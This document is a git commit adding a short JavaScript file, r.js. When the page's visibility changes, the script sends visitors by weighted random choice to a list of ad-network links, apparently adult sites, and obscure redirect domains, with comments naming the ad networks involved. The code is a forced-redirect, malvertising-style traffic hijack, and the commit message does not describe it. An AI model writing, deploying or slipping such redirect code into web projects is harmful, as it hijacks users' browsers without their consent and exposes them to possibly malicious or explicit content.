95c8bef6e355016f76d534ae352fd7e8be1bfb33
John <John@qq.com>
2025-04-23 22:18:26 +0800

    add a14 auto2 web

---
+++ a14/auto2/r.js
@@ -0,0 +1,53 @@
+onPageVisibilityChange(async function() {
+  const links = [
+    {
+      urls: [
+        // hil: db (ss)
+        "https://grim-package.com/b.3yVi0OPz3/pDvqblmoVxJWZ_DC0/1ZNhDOM/2KO/TacQ2HL/TiUO0JMmzLYw5-NizhcK",
+        "https://www.qrcreate.online",
+        "https://tidy-status.com/BskeKo",
+      ],
+      w: 2.0
+    },
+    {
+      urls: [
+        // clickadilla: Lucy
+        "https://hot123.top/tags/",
+        // clickadilla: db123
+        "https://sexylove.mjsj.sbs",
+        // clickadilla: Brian
+        "https://json.qrcreate.online",
+      ],
+      w: 3.0
+    },
+    // mon: db
+    {
+      urls: [
+        "https://ougeechimp.net/4/9249984",
+      ],
+      w: 1.4
+    },
+    {
+      urls: [
+        "https://ougeechimp.net/4/7436813",
+        "https://ougeechimp.net/4/7631332",
+      ],
+      w: 1.3
+    },
+    {
+      urls: [
+        "https://ougeechimp.net/4/7237907",
+        "https://ougeechimp.net/4/7237921",
+      ],
+      w: 1.2
+    },
+    {
+      urls: [
+        "https://ougeechimp.net/4/7614690",
+        "https://ougeechimp.net/4/7420696",
+      ],
+      w: 1.1
+    }
+  ];
+  redirectSelectLinkByWeight(links);
+});
